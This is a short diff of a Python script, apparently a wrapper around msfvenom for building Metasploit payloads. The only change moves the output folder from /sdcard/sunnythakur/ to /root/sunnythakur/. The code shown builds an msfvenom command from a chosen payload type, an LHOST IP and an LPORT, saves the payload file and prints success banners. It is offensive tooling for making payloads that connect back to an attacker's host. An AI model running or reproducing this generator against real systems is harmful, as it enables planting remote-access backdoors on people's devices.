@@ -106,7 +106,7 @@ def in_put ():
     with open ('userinput.txt', 'w') as file:
         file.write(type+' '+ip+' '+port)
 
-def create_payload (type, ip, port ,name, path='/sdcard/sunnythakur/'):
+def create_payload (type, ip, port ,name, path='/root/sunnythakur/'):
 
     print ('\n'+box+'Creating Your Payload\n'+box+'Keep Patience.....\n'+blue)
     x = "msfvenom -p "+type+' LHOST='+ip+' LPORT='+port+' -o '+path+name+' > /dev/null 2&>1'
@@ -149,7 +149,7 @@ def finaly (name):
     type = d_list[0]
     ip = d_list[1]
     port = d_list[2]
-    k = create_payload (type, ip, port ,name, path='/sdcard/sunnythakur/')
+    k = create_payload (type, ip, port ,name, path='/root/sunnythakur/')
     print('\n')
     if k.endswith('LPORT.') is True:
         lo = [red+'opps!!! Failed To Generate Payload',
@@ -169,7 +169,7 @@ def finaly (name):
             time.sleep (1.5)
         subprocess.call ('rm userinput.txt', shell=True)
         exit (0)
-    if os.path.exists('/sdcard/sunnythakur/'+name):
+    if os.path.exists('/root/sunnythakur/'+name):
         p = ['Your Payload Has Created....',
         'Congratulations....',
         'It has Saved in' +red+' Internal Storage...',
